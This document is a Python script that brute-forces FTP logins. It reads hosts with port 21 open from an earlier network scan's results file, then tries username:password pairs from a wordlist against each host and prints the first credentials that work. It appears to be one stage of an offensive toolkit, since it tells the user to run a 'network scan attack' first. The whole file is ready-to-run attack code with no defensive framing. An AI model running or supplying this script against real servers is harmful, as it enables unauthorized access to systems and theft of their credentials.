from ftplib import FTP

def read_file_to_list(file_path):
    lines = []
    try:
        with open(file_path, 'r') as file:
            lines = [line.rstrip() for line in file.readlines()]
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
    
    return lines

def read_targets():                                                                                    
    file_path = "scan_results.txt"                                                                     
    target_dict = {}                                                                                   
    try:                                                                                               
        with open(file_path, 'r') as file:                                                             
            lines = [line.rstrip() for line in file.readlines()]                                       
            # lines have the following format: <ip addres>:<open port 1>:<open port 2>:...             
            for target in lines:                                                                       
                l = target.split(":")                                                                  
                target_dict[l[0]] = l[1:]
    except FileNotFoundError:
        print(f"Error: File '{file_path}' not found.")
    except Exception as e: 
        print(f"An error occurred: {e}")

    return target_dict

def connect_ftp(host, username, password):
    ftp = FTP(host)
    try:
        ftp.login(username, password)
    except Exception as e:
            #print(f"Error connectinng ftp : {e}")                       
            return 1
    return ftp


def ftp_brute_force(targets, ftp_list):
    for ip in targets:
        for entry in ftp_list:
            ins = entry.split(":")
            ret = connect_ftp(ip, ins[0], ins[1])
            if ret == 1:
                continue
            else:
                print(f"For ip address: {ip}\n - username {ins[0]}\n - password: {ins[1]}")
                ret.quit()
                print("Disconnected from FTP server")
                return


if __name__ == "__main__":
    l = read_file_to_list("./wordlists/ftp_list.txt")
    targets = read_targets()
    if len(targets) == 0:
        print("Please run network scan attack first, scan_result.txt file is empty ")
        exit(1)
    ftp_targets = []
    for ip, ports in targets.items():
        if "21" in ports:
            ftp_targets.append(ip)
    ftp_brute_force(ftp_targets, l)

